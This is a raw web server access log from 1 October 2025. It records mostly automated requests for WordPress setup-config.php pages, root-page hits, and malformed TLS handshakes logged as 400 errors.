104.23.221.147 - - [01/Oct/2025:20:18:28 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
204.76.203.219 - - [01/Oct/2025:20:18:38 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
79.124.58.198 - - [01/Oct/2025:20:18:39 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xF6^\xD3\xDB\xE2Wg]\x1E\x95r?\x96\xA4Fj\x09\xDE\xE2p\x220\xE3S\xED\xEE\xAA\x88+\xE0Q\xB5 \xCD~\x9B\xEB\xC4>\x86\xA8\xF9\xC2\xC9`\x9Af\xAF\x94a\xF2\xDF\xC3\xEEw.\x12\xF1:\xDB\xC1\xC0" 400 157 "-" "-" "-"
104.23.221.147 - - [01/Oct/2025:20:20:43 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:20:20:44 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
162.158.110.189 - - [01/Oct/2025:20:20:48 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.224.92.17 - - [01/Oct/2025:20:21:09 +0000] "GET / HTTP/1.1" 301 169 "-" "-" "-"
124.222.142.44 - - [01/Oct/2025:20:22:43 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
104.23.221.147 - - [01/Oct/2025:20:39:21 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.71.246.235 - - [01/Oct/2025:20:39:25 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.70.240.20 - - [01/Oct/2025:20:41:16 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.70.240.21 - - [01/Oct/2025:20:41:16 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:20:41:31 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:20:41:31 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
198.235.24.141 - - [01/Oct/2025:20:44:15 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xA8]\xF6Q\xB3\xC1\xD4[0\x1B\x22\xD3\x99\xF9\xF4\xD4~\x97O\xAD\x8F$]EC\xDC\x02#\xFC2\xB6\x8E\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-" "-"
198.235.24.141 - - [01/Oct/2025:20:44:15 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xDD5x\xF7\xF4\xD50:\x18\xC5x\xB4$/\x9E\x9DG~\xB8\x9A\xA6\xFAZ~Q\xE5\x9B\xEE\x82\x88\xCE\xBC \x88$\x17\x03l" 400 157 "-" "-" "-"
185.203.132.199 - - [01/Oct/2025:20:46:02 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36" "-"
